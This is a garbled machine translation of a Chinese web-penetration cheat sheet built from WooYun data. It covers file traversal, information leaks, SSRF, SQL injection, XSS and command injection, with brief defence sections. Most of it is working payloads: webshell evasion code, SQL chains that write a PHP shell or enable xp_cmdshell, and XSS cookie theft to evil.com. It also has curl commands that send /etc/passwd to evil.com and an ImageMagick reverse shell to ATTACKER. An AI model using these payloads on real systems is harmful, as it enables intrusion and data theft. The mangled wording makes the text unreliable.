# emptybyte截break/judge (PHP<5.3.4 / Javaoldversion)
../../../etc/passwd%00.jpg

# asknumber截break/judge
../../../WEB-INF/web.xml%3f

# PathObfuscation
....//  |  ....\/  |  ..\/  |  ./../../

# 绝 for/toPath/Protocolbypass
/etc/passwd
file:///etc/passwd
file://localhost/etc/passwd
```

### 2.4 SensitiveFilePathQuick Reference Table

Linuxsystem:

```bash
/etc/passwd                    # usercolumntable(Validatepreferred)
/etc/shadow                    # Passwordhash
/etc/hosts                     # hostMap
/root/.ssh/id_rsa              # SSHPrivate Key
/root/.bash_history            # commandhistorical
/proc/self/environ             # Processenvironmentvariable
/etc/nginx/nginx.conf          # Nginxconfiguration
/etc/my.cnf                    # MySQLconfiguration
```

Windowssystem:

```bash
C:\windows\win.ini             # systemconfiguration(Validatepreferred)
C:\boot.ini                    # Startconfiguration(XP/2003)
C:\inetpub\wwwroot\web.config  # IISshould useconfiguration
C:\windows\system32\config\sam # SAMDatabase
```

Java Web:

```bash
WEB-INF/web.xml                         # coreconfiguration(Validatepreferred)
WEB-INF/classes/jdbc.properties          # Databaseconfiguration
WEB-INF/classes/applicationContext.xml   # Springconfiguration
WEB-INF/classes/hibernate.cfg.xml        # Hibernateconfiguration
```

PHPshould use:

```bash
config.php | config.inc.php | db.php | conn.php    # general/universalconfiguration
wp-config.php                           # WordPress
config_global.php | config_ucenter.php  # Discuz
application/config/database.php         # CodeIgniter
```

ASP.NET:

```bash
web.config                 # coreconfiguration(contain/includeConnectionstring)
../web.config              # ascendlevel/gradeDirectoryconfiguration
```

### 2.5 defensemeasure

```python
import os
def safe_file_access(user_input, base_dir):
    # 1. Pathspecification-ize
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    # 2. Validateat/inallowsDirectoryinner/inside
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")
    # 3. 白 namesingleExtension name
    # 4. ValidateFileexistat/in
    return full_path
```

 close/shutkeyprinciple: Pathspecification-ize(realpath/normpath) -> Directoryboundary/perimetervalidate -> 白 namesingleValidate -> mostsmallPermissionRun

---

## three、informationLeak/Disclosure

### 3.1 vulnerabilitythis质

```
informationLeak/Disclosurethis质: Attack SurfaceExpose -> trustchainbreak/judge裂 -> 纵deeppenetration
规律: one (counter)Leak/Disclosurepointcanleads towhole/integer (classifier)trustchain崩溃
      Sourcecode -> configuration -> Database -> intranet/internal network -> all沦陷
```

### 3.2 SensitiveFilePathDictionary

versioncontrolLeak/Disclosure:

```bash
# GitLeak/Disclosure (detectionPrioritymosthigh)
/.git/config          # contain/includeRemote仓Libraryaddress
/.git/HEAD            # when before/frontBranch
/.git/index           # 暂existdifferenceindex
/.git/logs/HEAD       # operationLog

# SVNLeak/Disclosure
/.svn/entries         # SVN 1.6及 with/bydescend
/.svn/wc.db           # SVN 1.7+ SQLiteDatabase

# exploittool: dvcs-ripper, GitHack, svn-extractor
```

backup fileLeak/Disclosure:

```bash
# CompressionPackageBackup (530例Hit)
/wwwroot.rar | /www.zip | /web.rar | /backup.zip | /site.tar.gz
/{domain}.zip | /{domain}.rar

# SQLBackup (136例Hit)
/backup.sql | /database.sql | /db.sql | /dump.sql

# configurationBackup (101例Hit)
/config.php.bak | /web.config.bak | /.env.bak
/config_global.php.bak
```

configurationFileLeak/Disclosure:

```bash
# general/universal
/.env | /.env.local | /.env.production
/config.yml | /config.json | /appsettings.json

# PHP
/config.php | /include/config.php | /data/config.php

# Java/Spring
/WEB-INF/web.xml | /WEB-INF/classes/application.properties
/WEB-INF/classes/jdbc.properties

# .NET
/web.config | /connectionStrings.config
```

探针/Debug/LogFile:

```bash
# 探针File
/phpinfo.php | /info.php | /test.php | /probe.php

# LogFile
/ctp.log | /logs/ctp.log | /debug.log | /storage/logs/

# Administrative Interface
/phpmyadmin/ | /pma/ | /adminer.php
/swagger-ui.html | /api-docs
/actuator/env                    # Spring Boot
```

### 3.3 detect/probemethodology

```
Phase 1 Passivegather: responsehead/top(Server/X-Powered-By) -> error/mistakepage -> robots.txt -> Sourcecodecomment/JS
Phase 2 define to/towardsdetect/probe: versioncontrol(.git/.svn) -> backup file(Domain Name/date) -> SensitivePath
Phase 3 Searchlead/guide擎: Google Hacking language method/law
```

Google Hackingquick reference:

```
site:target.com filetype:sql | filetype:bak | filetype:zip
site:target.com filetype:env | filetype:log
site:target.com inurl:.git | inurl:.svn
site:target.com inurl:phpinfo | intitle:phpinfo
site:target.com "db_password" | "mysql_connect"
```

### 3.4 informationexploitchain

```
SourcecodeLeak/Disclosure   -> configurationFile -> DatabaseCredential -> Databasereceive/connect管 -> Serverprivilege escalation
versioncontrol   -> SourcecodeAudit -> SQL Injectionetc.  -> managePermission   -> FileUploadgetshell
configurationLeak/Disclosure   -> DBConnection串 -> Database    -> userdata   -> 业务receive/connect管
LogLeak/Disclosure   -> Session  -> IdentityHijack  -> 业务data   -> Lateral Movement
APIinterface    -> Credential/Password -> Decryption     -> Batchcontrol   -> all/full面penetration
No.threedirectionCredential -> shortmessage/OSS -> Validatecode    -> accountreceive/connect管   -> dataLeak/Disclosure
```

### 3.5 defensemeasure

NginxSecurity Configuration:

```nginx
location ~ /\.(git|svn|env|htaccess|htpasswd) { deny all; return 404; }
location ~ \.(bak|sql|log|config|ini|yml)$ { deny all; return 404; }
location ~* /(backup|bak|old|temp|test|dev)/ { deny all; return 404; }
autoindex off;
server_tokens off;
```

ApacheSecurity Configuration:

```apache
<FilesMatch "\.(git|svn|env|bak|sql|log|config)">
    Order Allow,Deny
    Deny from all
</FilesMatch>
Options -Indexes
ServerSignature Off
```

CI/CDintegrated: deployment before/frontScanningSensitiveFile -> Prohibit.git/.svndeployment -> configurationFileEncryption

---

## four、SSRFand/withProtocolexploit

### 4.1 vulnerabilitythis质

```
SSRFthis质: Serviceend(side)generation/proxyfor/issend/issuestartrequest,Attackercontrolrequestgoal/target
risk: intranet/internal networkdetect/probe -> InternalServiceAccess -> FileRead -> commandExecute
```

### 4.2 commontriggerpoint

- FileDownloadmeritcanmiddle/center's/ofurlparameter
- Graph (classifier)Load/Proxymeritcan
- network页预view/截Graphmeritcan
- ImportURLmeritcan
- Webhook/return调configuration

### 4.3 Protocolexploit

```bash
# file:// - anymeaning/intentFileRead
file:///etc/passwd
file:///C:/windows/win.ini

# dict:// - Portdetect/probe/Serviceinteractive
dict://127.0.0.1:6379/info     # Redis
dict://127.0.0.1:11211/stats   # Memcached

# gopher:// - constructanymeaning/intentTCPrequest
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall

# http:// - intranet/internal networkdetect/probe
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/  # 云Metadata
```

### 4.4 bypasstip/trick

```bash
# IP变形bypass
127.0.0.1 -> 0x7f000001 -> 2130706433 -> 017700000001 -> 127.1
# DNS re-/heavyBind: parsing toExternalIP againfastspeed/fastswitch to127.0.0.1
# shortlink/302jump转: via/throughExternalURLjump转 tointranet/internal networkaddress
```

### 4.5 defensemeasure

1. 白 namesinglelimitation: limitationrequestgoal/targetDomain Name/IP
2. Protocollimitation: onlyallowshttp/https
3. intranet/internal networkisolation: ProhibitrequestRFC1918addressand127.0.0.1
4. DNSparsingValidate: parsing after/backagainvalidateIPreturn/belongbelong
5. Disable re-/heavydefine to/towards: orlimitation re-/heavydefine to/towards next/timenumber并againvalidate

---

## five、Serverconfigurationerror/mistake

### 5.1 parsingconfigurationerror/mistake

| issue/problem | risk | Inspect/Checkmethod |
|-----|------|---------|
| IIS 6.0parsingvulnerabilityun-repair/fix | `shell.asp;.jpg`canExecute | Uploadcontain/include part/pointnumberFile nameTest |
| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php`parsingfor/isPHP | UploadGraph (classifier)Access`/img.jpg/x.php` |
| Apachemulti/multiple after/back缀parsing | `shell.php.xxx`by (passive)parsing | UploaddoubleExtension nameFileTest |
| UploadDirectorycanExecutefootthis | Webshelldirectreceive/connectRun | UploadfootthisFileTest |
| DirectorycolumntableEnable/On | Exposeplacehas/haveFile | AccessDirectoryURLview |

### 5.2 Permissionconfigurationerror/mistake

| issue/problem | risk | repair/fix |
|-----|------|------|
| WebProcesshighPermissionRun | privilege escalation after/backdirectreceive/connectroot | uselowPermissionuserRun |
| UploadDirectory777Permission | anymeaning/intentWrite+Execute | setting644/755 |
| configurationFileReadable | CredentialLeak/Disclosure | 移exitWebDirectory,limitationPermission |
| manage after/back (classifier for machines)no/withoutIPlimitation | 公networkcanAccess | IP白 namesingle/VPN |

### 5.3 defaultconfigurationrisk

```bash
# defaultmanage after/back (classifier for machines)Path
/admin/ | /manager/ | /console/ | /system/
/phpmyadmin/ | /adminer.php

# defaultCredential (high频)
admin/admin | admin/123456 | admin/admin123
root/root | test/test

# defaultDebugPort
8080 (Tomcat) | 9090 (manage) | 3306 (MySQLinternet/external network)
6379 (Redisno/withoutPassword) | 27017 (MongoDBno/withoutAuthentication)
```

### 5.4 Spring Boot ActuatorLeak/Disclosure

```bash
/actuator/env          # environmentvariable(contain/includePassword)
/actuator/configprops  # configurationattribute
/actuator/heapdump     # HeapmemoryDump(contain/includeSensitivedata)
/actuator/mappings     # placehas/haveURLMap
```

---

## six、综combinesolid战Checklist

### 6.1 FileUploadTest

- [ ] ScanningcommonediteditdevicePath(FCKeditor/eWebEditor/UEditor)
- [ ] DisableJavaScriptTestFrontendValidate
- [ ] TestExtension namebypass: largesmallwrite/doublewrite/special after/back缀/%00截break/judge/ part/pointnumber截break/judge
- [ ] ModifyContent-Typefor/isimage/jpeg
- [ ] AddGIF89aFilehead/top / make/control as/doGraph (classifier)马
- [ ] identifyServertype,Testcorresponds toparsingvulnerability
- [ ] Test.htaccess/.user.iniUploadHijackparsing
- [ ] AnalysisFile命 namerule,TestPathbrute force
- [ ] TestRace ConditionUpload

### 6.2 Filetraverse/iterateTest

- [ ] identifyFile相 close/shutparameter(filename/path/file/url/download)
- [ ] foundation/basistraverse/iterate: `../../../../../etc/passwd`
- [ ] WindowsTest: `..\..\..\..\..\windows\win.ini`
- [ ] Java Web: `../WEB-INF/web.xml`
- [ ] URLEncodingbypass: `%2e%2e%2f` / double re-/heavyEncoding `%252e%252e%252f`
- [ ] Unicodebypass: `%c0%ae%c0%ae/`
- [ ] emptybyte截break/judge: `../etc/passwd%00.jpg`
- [ ] 绝 for/toPath: `/etc/passwd` / `file:///etc/passwd`

### 6.3 informationLeak/DisclosureScanning

- [ ] versioncontrol: `/.git/config` `/.svn/entries` `/.svn/wc.db`
- [ ] backup file: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
- [ ] configurationBackup: `/config.php.bak` `/web.config.bak` `/.env.bak`
- [ ] environmentFile: `/.env` `/.env.production`
- [ ] 探针File: `/phpinfo.php` `/info.php` `/test.php`
- [ ] LogFile: `/ctp.log` `/debug.log` `/storage/logs/`
- [ ] Administrative Interface: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
- [ ] Spring Boot: `/actuator/env` `/actuator/heapdump`
- [ ] Google Hacking language method/lawsupplementarySearch

### 6.4 SSRFTest

- [ ] identifyURL/Proxy/return调parameter
- [ ] Testfile:///etc/passwdProtocolRead
- [ ] Testintranet/internal networkaddress: http://127.0.0.1:port
- [ ] 云Metadata: http://169.254.169.254/latest/meta-data/
- [ ] IP变形bypass: Hexadecimal/Decimal/省strategywrite method/law
- [ ] DNS re-/heavyBind/302jump转bypass

---

## appendixA: highdangerCMSvulnerabilityquick reference

| CMS/system | vulnerabilitytype | Path | condition |
|---------|---------|------|------|
| ten thousanduser/accountOA ezOffice | anymeaning/intentUpload | `/defaultroot/dragpage/upload.jsp` | %00截break/judge |
|  use友协 as/doplatform | anymeaning/intentUpload | `/oaerp/ui/sync/excelUpload.jsp` | 绕JS+brute forceFile name |
| 金蝶GSiS | anymeaning/intentUpload | `/kdgs/core/upload/upload.jsp` | registeruser |
| 金智教育epstar | Filetraverse/iterate | `/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml` | no/without需Authentication |
| 致farOA | LogLeak/Disclosure | `/ctp.log` | directreceive/connectAccess |

## appendixB: Webshell免杀tip/trickquick reference

```php
$a = 'as'.'sert'; $a($_POST['x']);                    // variablejoinreceive/connect
array_map('ass'.'ert', array($_POST['x']));            // return调function
$f = create_function('', $_POST['x']); $f();           // dynamicfunction
set_exception_handler('system');                        // Exceptionprocess/handle
throw new Exception($_POST['cmd']);
```

## appendixC: general/universalvulnerabilityURLpattern

```bash
# PHPFiletraverse/iterate
/down.php?filename=../../../etc/passwd
/pic.php?url=[base64EncodingPath]

# JSPFiletraverse/iterate
/download.jsp?path=../WEB-INF/web.xml
/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# ASP/ASPXFiletraverse/iterate
/DownLoad.aspx?Accessory=../web.config
/download.ashx?file=../../../web.config

# Resinspecialhas/have
/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
```

---

> **供shouldchain/云deployment/FrameworkCVE** → alreadymigrationarrive [web-deployment-security.md](web-deployment-security.md)
> **CORS/GraphQL/HTTPwalk私/WebSocket/OAuth** → alreadymigrationarrive [web-modern-protocols.md](web-modern-protocols.md)

*based onWooYunvulnerabilityLibrary(88,636 (classifier))refine | only供security研究and/withdefensereference*

## References — web-injection

# WebInjectsecurity

> 精炼自WooYunvulnerabilityLibrarythreelargeInjecttypeknowledge base：SQL Injection(27,732例)、XSS(7,532例)、commandExecute(6,826例)
> datacomeSource：wooyun_vulnerabilities.json (88,636 (classifier)vulnerabilityLog/Record, 2010-2016)
> thisdocumentonlyused for/forsecurity研究and/withdefensereference

---

## one、SQL Injection

### 1.1 vulnerabilitythis质

```
Input Validationabsent → dynamicSQLjoinreceive/connect →  language义boundary/perimeter突破 → Database指 makeExecute
```

**core公 style/mode**：SQL Injection = codeand/withdataboundary/perimeterObfuscation + userinputenterimprovementfor/iscanExecuteSQL指 make

### 1.2 detectionmethod

#### highdangerInjectpointidentify

| Vectortype | 占比 | 典 typescenario |
|---------|------|---------|
| loginbox | 66% | user name/Passworddirectreceive/connectjoinreceive/connect |
| Searchbox | 64% | LIKE language sentencefuzzy/blurMatch |
| POSTparameter | 60% | tablesingleCommit |
| HTTPhead/top | 26% | UA/Referer/XFF |
| GETparameter | 24% | URLparameter |
| Cookie | 12% | Sessionidentifierprocess/handle |

**high频parameter name**：`id`, `sort_id`, `username`, `password`, `type`, `action`, `page`, `name`；ASP.NETspecialhas/have：`__viewstate`, `__eventvalidation`

#### fastspeed/fastdetectionprocess

```
1. singlelead/guidenumber/doublelead/guidenumberTest → observe报wrong
2. number学运compute: id=2-1 / id=1*1 → observeetc.priceproperty/nature
3. 布尔Test: and 1=1 / and 1=2 → comparisonresponsedifference
4. timelatency: and sleep(5) → observeresponsetime
5. Sort探column: order by N → passincreasearrive报wrong
```

#### DatabaseFingerprintidentify

| Database | latencyfunction | systemtable | error/mistakespecial征 |
|-------|---------|-------|---------|
| MySQL | `sleep(N)` / `benchmark()` | `information_schema.tables` | "You have an error in your SQL syntax" |
| MSSQL | `WAITFOR DELAY '0:0:N'` | `sysobjects` | "Unclosed quotation mark" |
| Oracle | `dbms_pipe.receive_message('a',N)` | `all_tables` | "ORA-00942" |
| Access | 笛卡尔积latency | `MSysObjects` | "Microsoft JET Database Engine" |

### 1.3 Injecttechniqueand/withPayload

#### 布尔Blind Injection

```sql
id=1 AND 1=1    -- True
id=1 AND 1=2    -- False
id=1' AND '1'='1
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### timeBlind Injection

```sql
-- MySQL（嵌setlatencysolid战tip/trick）
id=(select(2)from(select(sleep(8)))v)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

#### 联combinequery

```sql
id=1 ORDER BY N--              -- 探columnnumber
id=-1 UNION SELECT 1,2,3,4,5--  -- determinesreturnshow/displaybit
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### Error-Based Injection

```sql
-- MySQL extractvalue/updatexml
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
-- CHARfunctionbypasscharacterFilter
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+(SELECT CHAR(49))+CHAR(113))) AND 'a'='a
```

### 1.4 WAF/Filterbypasstip/trick

#### inner/inside联comment（mostoften use）

```sql
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3
-- DeDeCMSbypassinstance
/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x7C,userid,0x3a,pwd,0x7C),5,6,7,8,9+from+`#@__admin`#
```

#### Encodingbypass

```sql
-- Hexadecimal: 'admin' -> 0x61646d696e
SELECT * FROM users WHERE name=0x61646d696e
-- URLdouble re-/heavyEncoding: %252f -> / , %2527 -> '
-- Unicode: %u0027 -> '
```

#### largesmallwrite + empty白symbol/characterReplace

```sql
UnIoN SeLeCt                    -- largesmallwriteObfuscation
UNION/**/SELECT/**/1,2,3        -- comment替generation/proxyemptyformat/grid
UNION%09SELECT                  -- Tab替generation/proxy
UNION%0ASELECT                  -- 换row替generation/proxy
```

#### function替generation/proxy

```sql
SUBSTRING -> MID / SUBSTR / LEFT / RIGHT
CONCAT -> CONCAT_WS / ||
CHAR(65) -> characterA
```

#### logicetc.priceReplace

```sql
AND 1=1 -> && 1=1 -> & 1
OR 1=1  -> || 1=1 -> | 1
id=1 -> id LIKE 1 / id BETWEEN 1 AND 1 / id IN(1) / id REGEXP '^1$'
-- lead/guidenumberbypass
'admin' -> CHAR(97,100,109,105,110) -> 0x61646d696e
```

#### Wide Byte Injection（GBKEncoding）

```
%bf%27 bypass addslashes()   -- GBKdescendmulti/multiplebytecharacter吞掉negative/reverse斜杠
```

#### HTTPlayerbypass

```
parameter污染: id=1&id=2             --  re-/heavy repeatparameterObfuscation
 part/pointBlocktransmitinput: Transfer-Encoding: chunked
X-Forwarded-ForInject / CookieInject  -- non-often规Injectpoint
```

### 1.5 exploitchain

#### MySQL completewhole/integerexploitchain

```sql
-- 1.information -> 2.Library -> 3.table -> 4.column -> 5.data -> 6.File -> 7.Shell
union select 1,database(),version(),user(),5--
union select 1,group_concat(schema_name),3 from information_schema.schemata--
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--
union select 1,group_concat(username,0x3a,password),3 from users--
union select 1,load_file('/etc/passwd'),3--
union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
```

#### MSSQL completewhole/integerexploitchain

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,username+':'+password,3 from users--
-- commandExecute（需saPermission）
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'--
```

#### Oracleexploitchain

```sql
union select banner,null from v$version where rownum=1--
union select table_name,null from all_tables where rownum<=10--
union select username||':'||password,null from users--
```

#### AccessBlind Injectionexploitchain

```sql
-- no/withoutinformation_schema，需GetSourcecodeor猜table name
id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97
-- multi/multipleuserEnumeration useNOT IN
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

### 1.6 defensemeasure

```python
# parameter-izequery（preferred）
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # Python
```

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");        // PHP PDO
```

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); // Java
```

- parameter-izequery/预Compile language sentence（preferred）、storeprocess（ next/time选）
- 白 namesingleInput Validation + number typeparametermandatorytypeconversion
- DatabasemostsmallPermission + error/mistakeinformationhide/conceal + WAFdeployment

---

## two、XSS跨standfootthis

### 2.1 vulnerabilitythis质

```
userinputenter(data) -> un-Encodinginputexit -> Browserparsingfor/iscode -> footthisExecute
```

**core公 style/mode**：XSS = trustboundary/perimeter突破 + inputexitcontextObfuscation（dataat/inHTML/JS/CSS/URLmiddle/center language义change）

### 2.2 detectionmethod

#### highdangerinputexitpoint

| inputexitpoint | triggercondition | 典 typescenario |
|-------|---------|---------|
| user昵 call/Signature | pageLoad |  (counter)人homepage、comment、good友columntable |
| Searchboxreturnshow/display | Searchoperation | Searchresult/outcome页 |
| comment/stay/keep speech/language | contentexpandshow | 论坛、博客、Productevaluation |
| File name/description | Filecolumntable | networkround、相register |
| 邮 (classifier)body/title | 打 open邮 (classifier) | 邮箱system |
| Orderbackupnote |  after/back (classifier for machines)view | 电商 after/back (classifier for machines)、工singlesystem |

**隐蔽inputexitpoint**（easy遗漏）：HTTPhead/top(XFF/UAWriteLog)、WAPCommitPCexpandshow、Client昵 callWeb渲染、草稿箱/auditcolumntable

#### contextfastspeed/fastjudgebreak/judge

```
inputexitat/in <script> inner/inside？ -> JScontext（Inspect/Checklead/guidenumbertype）
inputexitat/inattributevaluemiddle/center？    -> attributecontext（Inspect/Checkattributetype）
inputexitat/intag/labelcontentmiddle/center？  -> HTMLcontext（Inspect/Checkspecialtag/labeltextarea/title）
inputexitat/inURLmiddle/center？       -> URLcontext（Inspect/CheckProtocollimitation）
inputexitat/inCSSmiddle/center？       -> CSScontext（Inspect/Checkexpressionsupports）
```

### 2.3 contextPayload

#### HTMLtag/labelcontent

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### HTMLattributevalue

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### JavaScriptstring

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URLcontext

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 WAF/Filterbypasstip/trick

#### Encodingbypass

```html
<!-- HTMLsolidbody -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + dataProtocol -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- CSSEncoding(IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### tag/label/attribute变形

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- largesmallwriteObfuscation -->
<script/src=//xss.com/x.js>            <!-- 斜杠替generation/proxyemptyformat/grid -->
<img src=x onerror=alert(1)>           <!-- no/withoutlead/guidenumber -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- doublewritebypass -->
<scr\x00ipt>alert(1)</script>          <!-- emptycharacterbypass -->
```

#### 替generation/proxyeventHandler

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### WAFspecificbypass

```html
.<script src=http://localhost/1.js>.    <!-- security宝： before/front after/backaddpointnumber -->
<!--[if true]><img onerror=alert(1) src=--> <!-- commentdry扰 -->
```

#### growdegree/measurelimitationbypass

```html
<script src=//xss.pw/j>                <!-- mostshortExternalLoad -->
<!-- DOMjoinreceive/connect -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- stringjoinreceive/connectbypass close/shutkeyword -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### HTTPOnlybypass

- FlashinterfaceGetuserinformation替generation/proxyCookie
- 转for/isCSRFway/manner：directreceive/connectExecuteSensitiveoperation（改Password、addmanagemember、读token）

### 2.5 exploitchain

#### Cookie窃take/get

```html
<script>new Image().src="https://evil.com/c?="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie">
<script>fetch('https://evil.com/c?='+document.cookie)</script>
```

#### DOM XSS close/shutkeySourceand/with汇

**danger险Source**：`location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**danger险汇**：`innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### XSSWormcorelogic

```javascript
// 1.Getwhen before/frontuserIdentity(cookie/token)
// 2.constructincludes/contains自身payload's/ofcontent
// 3.Automaticrelease/ part/pointenjoy（AJAX POST）
// 4.triggercondition：view/Accessi.e.transmit播
function worm(){
    jQuery.post("/api/post", {"content": "<自transmit播payload>"})
}
worm()
```

#### combinationexploitpattern

```
XSS + CSRF -> GetTokenExecutemanageoperation
XSS + SQLi -> 盲打GetCookie ->  after/back (classifier for machines)Inject
XSS -> accountHijack -> Privilege Escalation -> Wormtransmit播
XSS盲打(stay/keep speech/language/工single/negative/reverse馈) -> Get after/back (classifier for machines)managememberCookie
```

### 2.6 defensemeasure

- **Output Encoding**（core）：HTMLcontext useHTMLsolidbody，JScontext useJSEncoding，URLcontext useURLEncoding
- CSPstrategylimitationfootthiscomeSource
- HTTPOnlyprotectionCookie
- 白 namesingleInput Validation（Avoid黑 namesingle，totalhas/have遗漏）
- **commonlosserror**： (classifier)Filterscripttag/label、 (classifier)Filtersmallwrite、FrontendFiltercangrab/capturePackagebypass、single next/timeFilterby (passive)doublewritebypass

---

## three、commandExecute

### 3.1 vulnerabilitythis质

```
userinputenter(data) -> un-clean-izejoinreceive/connect -> entersystemcommand/codeExecutecontext -> OS指 makeExecute
```

**core公 style/mode**：commandExecute = dataStream污染 + Executecontext（Shell/code/tablereach style/mode）

### 3.2 detectionmethod

#### high频entry point

| enter口type | 占比 | 典 typescenario |
|---------|------|---------|
| Fileoperation | 68% | Upload、Read、Decompression |
| systemcommandfunction | 62% | exec/system/shell_exec |
| Struts2Framework | 50% | OGNLtablereach style/modeInject |
| SSRF | 30% | URLparametertransmitpass |
| pingcommand | 26% | network诊break/judgemeritcan |
| Graph (classifier)process/handle | 24% | ImageMagick |
| JavaDeserialization | 20% | WebLogic/JBoss |

#### commandjoinreceive/connectsymbol

| symbol | contain/include义 | Executelogic |
|------|------|---------|
| `;` |  part/point隔symbol/character | sequentialExecute，not管 before/frontcommandresult/outcome |
| `\|` | Pipe |  before/frontinputexit as/dofor/is after/backinputenter |
| `` ` `` / `$()` | commandReplace | ExecuteInternalcommand并returnsresult/outcome |
| `\|\|` | logicor |  before/frontfailurejustExecute after/back |
| `&&` | logicand/with |  before/front become/successmeritjustExecute after/back |
| `%0a` / `%0d%0a` | 换row | URLEncoding换row part/point隔 |

#### no/withoutreturnshow/displaydetection

```bash
# DNSLogoutbring/carry
ping `whoami`.xxxxx.ceye.io
curl http://`whoami`.xxxxx.ceye.io

# HTTPoutbring/carry
curl https://evil.com/?d=`cat /etc/passwd | base64 | tr '\n' '-'`
curl -X POST -d "data=$(cat /etc/passwd)" https://evil.com/c

# timelatency
sleep 5
ping -c 5 127.0.0.1

# FileWriteWebDirectory
echo "test" > /var/www/html/proof.txt
```

### 3.3 bypasstip/trick

#### emptyformat/gridbypass

```bash
cat${IFS}/etc/passwd          # ${IFS}Internalword paragraph/segment part/point隔symbol/character
cat$IFS$9/etc/passwd          # $9for/isempty's/oflocationparameter
cat%09/etc/passwd             # Tabmake/controltablesymbol/character
cat</etc/passwd               #  re-/heavydefine to/towardssymbol/character
{cat,/etc/passwd}             # large括numberExtension
```

####  close/shutkeywordbypass

```bash
# lead/guidenumber/negative/reverse斜杠 part/point割
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# variablejoinreceive/connect
a=c;b=at;$a$b /etc/passwd

# commonmatchsymbol/character
/bin/ca* /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
```

#### catcommand替generation/proxy

```bash
tac  head  tail  more  less  nl  sort  uniq  od -c  xxd  base64  rev  paste
```

#### Encodingbypass

```bash
# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"

# Hex
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

### 3.4 exploitchainand/withPayload

#### Framework/ComponentvulnerabilityPayload

**ImageMagick (CVE-2016-3714)**：

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|bash -i >& /dev/tcp/ATTACKER/8080 0>&1 &")'
pop graphic-context
```

**Struts2 S2-045**：

```
